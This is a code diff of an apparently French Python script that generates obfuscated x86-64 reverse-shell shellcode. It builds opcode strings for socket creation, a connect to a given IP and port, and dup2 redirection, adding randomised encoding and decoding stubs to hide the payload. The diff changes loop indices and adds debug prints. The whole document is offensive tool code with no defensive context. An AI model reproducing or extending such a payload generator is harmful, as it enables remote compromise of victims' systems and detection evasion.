@@ -104,7 +104,7 @@ def deOffus(factorOffusVar, string_to_deof):
     if factorOffusVar < 0 :
         factorOffusVar *= -1 
         if factorOffusVar < 10 :
-            for i in range(1, len(string_to_deof)):
+            for i in range(2, len(string_to_deof)):
                 addString+="0"+str(factorOffusVar)
             return "4883eb"+addString
         
@@ -117,7 +117,7 @@ def deOffus(factorOffusVar, string_to_deof):
             elif factorOffusVar == 14 : newFactor = "e"
             elif factorOffusVar == 15 : newFactor = "f"
 
-            for i in range(1, len(string_to_deof)):
+            for i in range(2, len(string_to_deof)):
                 addString+="0"+str(newFactor)
 
             return "4883eb"+addString
@@ -193,6 +193,7 @@ def create_socket():
     PAYLOAD += call()
 
 
+
 def socket_connect(ip, port):
    
    global PAYLOAD
@@ -208,11 +209,13 @@ def socket_connect(ip, port):
         of_string = offus("042a", random1)
         #Inverse en mirroir tout la chaine pour op code
         of_string = of_string[::-1]
+        print("2:", of_string)
         PAYLOAD += "48bb"
         PAYLOAD+=of_string
 
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
+        print("1", deof_string, random1, add_string)
         #Inverse en mirroir tout la chaine pour op code
         deof_string = deof_string[::-1]
 
@@ -222,14 +225,17 @@ def socket_connect(ip, port):
         of_string = offus("b02a", random1)
         #Inverse en mirroir tout la chaine pour op code
         of_string = of_string[::-1]
+        print("2:", of_string)
         PAYLOAD += "48bb"
         PAYLOAD+=of_string
 
         #Désoffuscation
         deof_string = deOffus(random1, add_string)
+        print("1", deof_string, random1, add_string)
         #Inverse en mirroir tout la chaine pour op code
         deof_string = deof_string[::-1]
    
+   print(add_string)
    add_string += deof_string 
    add_string += clean("rbx")
    add_string += "53" # push rbx
@@ -276,6 +282,7 @@ def dup2x3():
         else:
             PAYLOAD += '48ffc6' # inc rsi
         PAYLOAD += call()
+
 
 
 
